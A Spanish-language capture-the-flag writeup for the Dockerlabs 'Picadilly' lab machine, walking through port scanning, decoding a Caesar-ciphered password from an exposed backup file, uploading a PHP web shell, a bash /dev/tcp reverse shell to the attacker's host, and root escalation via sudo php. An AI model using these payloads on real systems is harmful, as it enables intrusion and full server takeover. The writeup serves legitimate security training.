
# Writeup Template: Maquina `[ Picadilly ]`

- Tags: #Picadilly
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina PIcadilly](https://mega.nz/file/xf8F2DQK#gHSypFAv6z4oM_ltNmfR4myrQHFMSEy8mh2ZvOz5CSg)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x picadilly.zip
sudo bash auto_deploy.sh picadilly.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,443 172.17.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.59 ]) **debianSid**
2. `[ 443 ]/[ TCP ]`: [ Apache ] ([ 2.4.59 ]) **debianSid**
---

## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada craitico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/: Root directory w/ listing on 'apache/2.4.59 (debian)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- No reporta nada relevante:

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.back,backup,txt,sh,tar,zip
```

- **Hallazgos**:
```bash
/backup.txt           (Status: 200) [Size: 215]
```

Revisando en la web pricipal tenemos esta informacion en un archivo expuesto:
```bash
http://172.17.0.2/backup.txt
```

Informacion:
```bash
/// The users mateo password is ////
----------- hdvbfuadcb ------------

"To solve this riddle, think of an ancient Roman emperor and his simple method of shifting letters."

////////////////////////////////////
```

Usaremos nuestra herramienta en **python3** para descifrar esa cadena en **cifradoCesar**:
```python
#!/usr/bin/env python3
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para cifrar/descifrar usando Cifrado César")
    parser.add_argument("-t", "--text", required=True, dest="texto", help="Texto a procesar")
    parser.add_argument("-k", "--key", type=int, default=3, help="Clave de desplazamiento (por defecto 3)")
    parser.add_argument("-d", "--descifrar", action="store_true", help="Descifrar en lugar de cifrar")
    
    return parser.parse_args()

def cesar(texto, k, descifrar=False):
    resultado = []
    if descifrar:
        k = -k  # Invertimos el desplazamiento para descifrar
    
    for letra in texto:
        if letra.isalpha():
            base = 'A' if letra.isupper() else 'a'
            nueva_letra = chr((ord(letra) - ord(base) + k) % 26 + ord(base))
            resultado.append(nueva_letra)
        else:
            resultado.append(letra)

    return ''.join(resultado)

def main():
    args = get_arguments()
    
    # Procesar el texto que le pasemos como argumento
    resultado = cesar(
        texto=args.texto,
        k=args.key,
        descifrar=args.descifrar
    )
    
    print(resultado)

if __name__ == '__main__':
    main()
```

La usamos de esta manera: **( -t = texto ) ( -k = desplazamiento ) ( -d = descifrar )**
```bash
python3 desencriptador.py -t "hdvbfuadcb" -k 3 -d

easycrxazy # Resultado
```
### Credenciales Encontradas
- Usuario: `[ mateo ]`
- Contraseña: `[ easycrxazy ]`

Ahora nos diridimos a esta direccion web que es el otro puerto expuesto:
```bash
https://172.17.0.2/
```

Vemos que podemos cargar archivos en el sistema, Asi que intentamos ver si existe la carpeta **uploads** y vemos que si existe: **-k** ignora el certificado **ssl**
```bash
gobuster dir -u https://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -k

/uploads/             (Status: 200) [Size: 1138] # Resultado
```

```bash
https://172.17.0.2/uploads/
```

Asi que lo que subamos se tendra que cargar aqui y subiremos un archivo php malicioso que nos permita ganar acceso al target **( shell.php )**
```php
<?php
  system($_GET["cmd"]);
?>
```

Intentamos subir el archivo: **( shell.php )** y Revisando esta ruta vemos que se ha cargado correctamente al no existir ninguana validacion:
```bash
https://172.17.0.2/uploads/
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos un archivo maliciosos cargado en el servidor lo ejecutaremos para ganar acceso al servidor.

### Ejecucion del Ataque
```bash
# Comandos para explotación
https://172.17.0.2/uploads/shell.php?cmd=whoami 
```

### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
https://172.17.0.2/uploads/shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd
```

Listando los usuarios del sistema, vemos que si existe el usuario **mateo** pero la pasword que nos devolvio nuestra herramienta no es correcta: **( easycrxazy )** 
Pensando que es un error de ortografia ya que **crazy** es la palabra correcta quedando asi: **( easycrazy )**
```bash
su mateo # ( easycrazy )
```
### Explotacion de Privilegios

###### Usuario `[ Mateo ]`:
Una ves logueados como este usuaro veremos la forma de escalar a **root**
```bash
sudo -l

User mateo may run the following commands on 7d4ec0862d9d:
    (ALL) NOPASSWD: /usr/bin/php # Tenemos una via potencial de migrar a root
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/php ]`
- Credenciales de usuario: `[ mateo ]:[ easycrazy ]`

```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/php -r "system('/bin/bash');"
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@7d4ec0862d9d:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos que es el **cifrado cesar**
2. Aprendimos a crear un script para desencriptar **cifrado cesar** 

## Recomendaciones de Seguridad
- No usar **cifrado cesar** para contrasenas es muy facil de romper
- Controlar el tipo de archivos que se pueden subir al servidor